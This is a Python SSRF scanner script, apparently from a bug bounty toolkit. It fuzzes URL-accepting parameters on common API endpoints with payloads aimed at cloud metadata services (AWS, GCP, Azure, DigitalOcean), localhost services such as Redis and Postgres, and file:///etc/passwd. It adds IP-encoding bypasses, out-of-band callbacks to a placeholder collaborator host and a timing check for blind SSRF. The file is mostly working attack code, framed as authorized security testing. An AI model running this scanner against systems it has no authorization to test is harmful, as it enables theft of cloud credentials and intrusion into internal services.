#!/usr/bin/env python3
"""SSRF Scanner — CWE-918 (Server-Side Request Forgery).

Comprehensive SSRF testing combining:
  1. Parameter fuzzing on URL-accepting endpoints
  2. Cloud metadata probing (AWS IMDS v1/v2, GCP, Azure)
  3. Internal service discovery (Redis, PostgreSQL, Elasticsearch)
  4. IP encoding bypass (decimal, hex, IPv6, short form, DNS rebinding)
  5. Protocol smuggling (file://, gopher://, dict://)
  6. Out-of-band SSRF via configurable callback URL

Source: ssrf_probe.py from real bug bounty campaign.

Usage:
    python ssrf_scanner.py --target https://example.com --dry-run
    python ssrf_scanner.py --target https://example.com --callback-url https://your.oastify.com

⚠️ Contenu généré par IA — validation humaine requise avant utilisation.
"""

from __future__ import annotations

import sys

from lib import (
    Finding,
    RateLimitedSession,
    get_session_from_env,
    load_config,
    log,
    parse_base_args,
    save_findings,
)

# ---------------------------------------------------------------------------
# SSRF Payloads — progressive (safe → aggressive)
# ---------------------------------------------------------------------------

DEFAULT_CALLBACK = "https://REPLACE-WITH-YOUR-CALLBACK.oastify.com"

SSRF_PAYLOADS = [
    # Cloud metadata — most critical
    {"name": "AWS IMDS v1", "url": "http://169.254.169.254/latest/meta-data/", "severity": "critical"},
    {"name": "AWS IMDS v2 (token)", "url": "http://169.254.169.254/latest/api/token", "severity": "critical"},
    {"name": "GCP metadata", "url": "http://metadata.google.internal/computeMetadata/v1/", "severity": "critical"},
    {"name": "Azure metadata", "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "severity": "critical"},
    {"name": "DigitalOcean metadata", "url": "http://169.254.169.254/metadata/v1/", "severity": "critical"},

    # Internal services
    {"name": "Localhost 80", "url": "http://127.0.0.1/", "severity": "high"},
    {"name": "Localhost 3000 (Rails/Node)", "url": "http://127.0.0.1:3000/", "severity": "high"},
    {"name": "Localhost 5432 (Postgres)", "url": "http://127.0.0.1:5432/", "severity": "high"},
    {"name": "Localhost 6379 (Redis)", "url": "http://127.0.0.1:6379/", "severity": "high"},
    {"name": "Localhost 9200 (Elasticsearch)", "url": "http://127.0.0.1:9200/", "severity": "high"},
    {"name": "Localhost 8500 (Consul)", "url": "http://127.0.0.1:8500/v1/catalog/services", "severity": "high"},
    {"name": "Localhost 2379 (etcd)", "url": "http://127.0.0.1:2379/v2/keys/", "severity": "high"},

    # Protocol smuggling
    {"name": "File /etc/passwd", "url": "file:///etc/passwd", "severity": "high"},
    {"name": "File /etc/hosts", "url": "file:///etc/hosts", "severity": "medium"},

    # IP encoding bypasses
    {"name": "Decimal IP (127.0.0.1)", "url": "http://2130706433/", "severity": "high"},
    {"name": "IPv6 loopback", "url": "http://[::1]/", "severity": "high"},
    {"name": "Hex IP", "url": "http://0x7f000001/", "severity": "high"},
    {"name": "Short form", "url": "http://0/", "severity": "medium"},
    {"name": "Octal IP", "url": "http://0177.0.0.1/", "severity": "high"},
    {"name": "DNS rebind 127", "url": "http://127.0.0.1.nip.io/", "severity": "high"},
    {"name": "DNS rebind spoofed", "url": "http://localtest.me/", "severity": "medium"},
    {"name": "IPv6 mapped v4", "url": "http://[::ffff:127.0.0.1]/", "severity": "high"},
]

# Parameters commonly accepting URLs
URL_PARAMS = [
    "url", "uri", "link", "src", "source", "redirect", "redirect_uri",
    "callback", "callback_url", "webhook", "webhook_url", "endpoint",
    "next", "return_to", "return_url", "continue", "goto", "dest",
    "destination", "target", "path", "file", "image", "avatar",
    "icon", "logo", "feed", "import_url", "export_url", "fetch",
    "proxy", "remote", "ref", "reference",
]

# Generic endpoints likely to accept URL parameters
DEFAULT_SSRF_ENDPOINTS = [
    # Settings/config endpoints
    {"path": "/api/settings", "method": "GET", "param_type": "query"},
    {"path": "/api/settings", "method": "POST", "param_type": "json"},

    # Import/export
    {"path": "/api/import", "method": "POST", "param_type": "json"},
    {"path": "/api/export", "method": "POST", "param_type": "json"},

    # Avatar / image / file upload from URL
    {"path": "/api/users/avatar", "method": "POST", "param_type": "json"},
    {"path": "/api/profile/avatar", "method": "POST", "param_type": "json"},
    {"path": "/api/upload", "method": "POST", "param_type": "json"},
    {"path": "/api/documents", "method": "POST", "param_type": "json"},
    {"path": "/api/files", "method": "POST", "param_type": "json"},

    # Webhook / notification
    {"path": "/api/webhooks", "method": "POST", "param_type": "json"},
    {"path": "/api/notifications/webhook", "method": "POST", "param_type": "json"},
    {"path": "/api/integrations", "method": "POST", "param_type": "json"},

    # Preview / proxy / fetch
    {"path": "/api/preview", "method": "GET", "param_type": "query"},
    {"path": "/api/proxy", "method": "GET", "param_type": "query"},
    {"path": "/api/fetch", "method": "GET", "param_type": "query"},
    {"path": "/api/render", "method": "POST", "param_type": "json"},

    # OAuth / SSO callbacks
    {"path": "/oauth/callback", "method": "GET", "param_type": "query"},
    {"path": "/auth/callback", "method": "GET", "param_type": "query"},
]

# Cloud metadata indicators in response body
METADATA_INDICATORS = [
    "ami-id", "instance-id", "iam",              # AWS
    "computeMetadata", "project-id",              # GCP
    "vmId", "subscriptionId",                     # Azure
    "root:x:0", "/bin/bash", "/bin/sh",           # /etc/passwd
    "localhost", "127.0.0.1",                     # /etc/hosts
    "droplet_id",                                 # DigitalOcean
]


# ---------------------------------------------------------------------------
# Scanner functions
# ---------------------------------------------------------------------------


def test_ssrf_endpoints(
    sess: RateLimitedSession,
    base: str,
    endpoints: list[dict],
    dry_run: bool,
) -> list[Finding]:
    """Test each endpoint with SSRF payloads on URL-accepting parameters."""
    findings: list[Finding] = []

    # Use top payloads and params to stay within rate limits
    test_payloads = SSRF_PAYLOADS[:8]
    test_params = URL_PARAMS[:10]

    for endpoint in endpoints:
        url = f"{base}{endpoint['path']}"

        for param in test_params:
            for payload in test_payloads:
                if dry_run:
                    log.info("[dry-run] %s %s {%s: %s}",
                             endpoint["method"], url, param, payload["name"])
                    continue

                try:
                    if endpoint["method"] == "GET":
                        r = sess.get(url, params={param: payload["url"]})
                    else:
                        r = sess.post(url, json={param: payload["url"]})

                    log.debug("  %s %s [%s=%s] → %d (%d bytes)",
                              endpoint["method"], endpoint["path"],
                              param, payload["name"],
                              r.status_code, len(r.content))

                    # Detection: check for cloud metadata in response
                    is_ssrf = False
                    evidence_detail = ""

                    if r.status_code == 200:
                        body = r.text.lower()
                        for indicator in METADATA_INDICATORS:
                            if indicator.lower() in body:
                                is_ssrf = True
                                evidence_detail = f"Response contains '{indicator}'"
                                break

                    if is_ssrf:
                        findings.append(Finding(
                            title=f"SSRF via {param} on {endpoint['path']}",
                            severity=payload.get("severity", "high"),
                            cwe="CWE-918",
                            endpoint=url,
                            method=endpoint["method"],
                            description=(
                                f"Server-side request forgery on {endpoint['path']} "
                                f"via '{param}' parameter. Payload: {payload['name']}. "
                                f"{evidence_detail}."
                            ),
                            steps=[
                                f"{endpoint['method']} {url}",
                                f"Set '{param}' = '{payload['url']}'",
                                f"Response: {r.status_code} — {evidence_detail}",
                            ],
                            impact=(
                                "SSRF allows access to internal services, cloud metadata, "
                                "and potentially sensitive infrastructure data."
                            ),
                            evidence={
                                "param": param,
                                "payload": payload["url"],
                                "payload_name": payload["name"],
                                "status": r.status_code,
                                "response_length": len(r.content),
                                "response_snippet": r.text[:500],
                            },
                        ))
                        log.warning("⚠ SSRF: %s param=%s payload=%s",
                                    endpoint["path"], param, payload["name"])
                        break  # One confirmed payload per param is enough

                except Exception as e:
                    log.debug("  %s %s [%s=%s]: %s",
                              endpoint["method"], endpoint["path"],
                              param, payload["name"], e)

    return findings


def test_oob_ssrf(
    sess: RateLimitedSession,
    base: str,
    callback_url: str,
    endpoints: list[dict],
    dry_run: bool,
) -> list[Finding]:
    """Test out-of-band SSRF using callback URL (Burp Collaborator / interactsh)."""
    findings: list[Finding] = []

    if callback_url == DEFAULT_CALLBACK:
        log.warning("⚠ Using default callback URL — replace with your own "
                    "(Burp Collaborator / interactsh). Skipping OOB tests.")
        return findings

    # Test high-value POST endpoints with callback
    oob_params = ["url", "webhook_url", "callback_url", "source_url", "endpoint"]

    for endpoint in endpoints:
        if endpoint["method"] != "POST":
            continue

        url = f"{base}{endpoint['path']}"
        for param in oob_params:
            tagged = f"{callback_url}/{endpoint['path'].replace('/', '_')}_{param}"

            if dry_run:
                log.info("[dry-run] OOB SSRF: POST %s {%s: %s}", url, param, tagged)
                continue

            try:
                r = sess.post(url, json={param: tagged})
                log.info("  OOB %s [%s] → %d (check callback for DNS/HTTP hit)",
                         endpoint["path"], param, r.status_code)
            except Exception as e:
                log.debug("  OOB %s [%s]: %s", endpoint["path"], param, e)

    log.info("Check your callback URL for incoming requests: %s", callback_url)
    return findings


def test_blind_ssrf_timing(
    sess: RateLimitedSession,
    base: str,
    dry_run: bool,
) -> list[Finding]:
    """Detect blind SSRF via timing differences (internal vs external)."""
    findings: list[Finding] = []
    import time

    test_endpoint = f"{base}/api/fetch"
    internal_url = "http://127.0.0.1:22/"      # SSH port — will hang or be slow
    external_url = "http://example.com/"          # Known fast response

    if dry_run:
        log.info("[dry-run] Blind SSRF timing test on %s", test_endpoint)
        return findings

    try:
        # Baseline: external URL
        start = time.monotonic()
        sess.get(test_endpoint, params={"url": external_url})
        external_time = time.monotonic() - start

        # Test: internal URL (may timeout or differ)
        start = time.monotonic()
        sess.get(test_endpoint, params={"url": internal_url})
        internal_time = time.monotonic() - start

        time_diff = abs(internal_time - external_time)
        if time_diff > 2.0:  # >2s difference suggests SSRF
            findings.append(Finding(
                title="Blind SSRF detected via timing on /api/fetch",
                severity="high",
                cwe="CWE-918",
                endpoint=test_endpoint,
                method="GET",
                description=(
                    f"Timing-based blind SSRF. External URL: {external_time:.2f}s, "
                    f"Internal URL: {internal_time:.2f}s (Δ{time_diff:.2f}s)."
                ),
                steps=[
                    f"GET /api/fetch?url={external_url} → {external_time:.2f}s",
                    f"GET /api/fetch?url={internal_url} → {internal_time:.2f}s",
                    f"Time difference: {time_diff:.2f}s (>2s threshold)",
                ],
                impact="Blind SSRF confirmed — server processes internal URLs differently.",
                evidence={
                    "external_time": round(external_time, 3),
                    "internal_time": round(internal_time, 3),
                    "time_diff": round(time_diff, 3),
                },
            ))
            log.warning("⚠ Blind SSRF timing: Δ%.2fs", time_diff)
    except Exception as e:
        log.debug("  Timing test: %s", e)

    return findings


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def main() -> None:
    parser = parse_base_args()
    parser.add_argument("--callback-url", default=DEFAULT_CALLBACK,
                        help="OOB callback URL (Burp Collaborator / interactsh)")
    args = parser.parse_args()

    if args.verbose:
        log.setLevel("DEBUG")

    config = load_config(args.config)
    sess = get_session_from_env()
    base = args.target.rstrip("/")

    # Config overrides
    endpoints = config.get("endpoints") or DEFAULT_SSRF_ENDPOINTS
    callback_url = args.callback_url

    findings: list[Finding] = []

    log.info("=" * 60)
    log.info("SSRF Scanner")
    log.info("Target: %s | Endpoints: %d | Dry-run: %s", base, len(endpoints), args.dry_run)
    log.info("Callback: %s", callback_url)
    log.info("=" * 60)

    # Phase 1: Parameter fuzzing with SSRF payloads
    log.info("[phase 1] Testing %d endpoints with %d payloads...",
             len(endpoints), len(SSRF_PAYLOADS))
    findings.extend(test_ssrf_endpoints(sess, base, endpoints, args.dry_run))

    # Phase 2: Out-of-band SSRF
    log.info("[phase 2] Testing OOB SSRF via callback...")
    findings.extend(test_oob_ssrf(sess, base, callback_url, endpoints, args.dry_run))

    # Phase 3: Blind SSRF via timing
    log.info("[phase 3] Blind SSRF timing test...")
    findings.extend(test_blind_ssrf_timing(sess, base, args.dry_run))

    log.info("=" * 60)
    log.info("Results: %d findings", len(findings))
    if findings and not args.dry_run:
        save_findings(findings, "ssrf-scanner")


if __name__ == "__main__":
    main()
